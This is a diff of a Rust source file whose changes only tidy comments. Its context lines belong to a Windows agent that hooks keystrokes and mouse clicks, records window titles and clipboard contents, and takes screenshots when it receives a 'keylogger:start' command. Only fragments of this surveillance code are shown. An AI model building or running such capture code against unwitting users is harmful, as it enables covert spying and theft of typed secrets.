@@ -242,7 +242,7 @@ mod windows {
 
     use super::{update_activity, LAST_ACTIVITY_SECS};
 
-    // State Tracking — safe wrappers replacing static mut
+    // State Tracking - safe wrappers replacing static mut
     static LAST_WINDOW: Mutex<Option<String>> = Mutex::new(None);
     static LAST_CLIPBOARD: Mutex<Option<String>> = Mutex::new(None);
 
@@ -343,8 +343,8 @@ mod windows {
         CallNextHookEx(KB_HOOK.load(Ordering::Relaxed), n_code, w_param, l_param)
     }
 
-    // FIX 2: capture_context is no longer called directly inside the hook callback.
-    // Low-level mouse hooks must return quickly — GDI allocation + PNG encoding can
+    // Capture_context is no longer called directly inside the hook callback.
+    // Low-level mouse hooks must return quickly - GDI allocation + PNG encoding can
     // exceed the LowLevelHooksTimeout (default 5 s), causing Windows to silently
     // remove the hook. The click coordinates are copied by value into the closure
     // so the spawned thread owns them independently of the hook struct lifetime.
@@ -433,7 +433,7 @@ mod windows {
                             *lw = Some(title.clone());
                         }
                         None => {
-                            // First keystroke — record the window without logging a change
+                            // First keystroke - record the window without logging a change
                             *lw = Some(title.clone());
                         }
                         _ => {} // Same window, no action
@@ -475,7 +475,7 @@ mod windows {
 
             let mut pixels: Vec<u8> = vec![0; (width * height * 4) as usize];
             if GetDIBits(h_mem_dc, h_bitmap, 0, height as u32, pixels.as_mut_ptr() as *mut c_void, &mut bmi, DIB_RGB_COLORS) != 0 {
-                // BGR → RGB and set full alpha
+                // BGR -> RGB and set full alpha
                 for chunk in pixels.chunks_exact_mut(4) {
                     let b = chunk[0]; chunk[0] = chunk[2]; chunk[2] = b; chunk[3] = 255;
                 }
@@ -553,7 +553,7 @@ mod windows {
     pub fn start_monitor_capture_thread() {
         thread::spawn(|| {
             unsafe {
-                // FIX 1: Replaced `Instant::now() - Duration::from_secs(1000)` which
+                // Replaced `Instant::now() - Duration::from_secs(1000)` which
                 // panics on Windows when system uptime < 1000 s (~17 min). With
                 // `panic = "abort"` in the release profile that panic kills the entire
                 // agent process the moment `keylogger:start` is received on any
@@ -609,7 +609,7 @@ mod windows {
             return;
         }
 
-        // FIX 3: Seed LAST_ACTIVITY_SECS with the current Unix timestamp so that
+        // Seed LAST_ACTIVITY_SECS with the current Unix timestamp so that
         // idle detection starts in "active" mode. Previously the static was
         // initialised to 0 (Unix epoch, Jan 1 1970), making `seconds_idle` appear
         // to be ~55 years on the first check. This forced the monitor capture
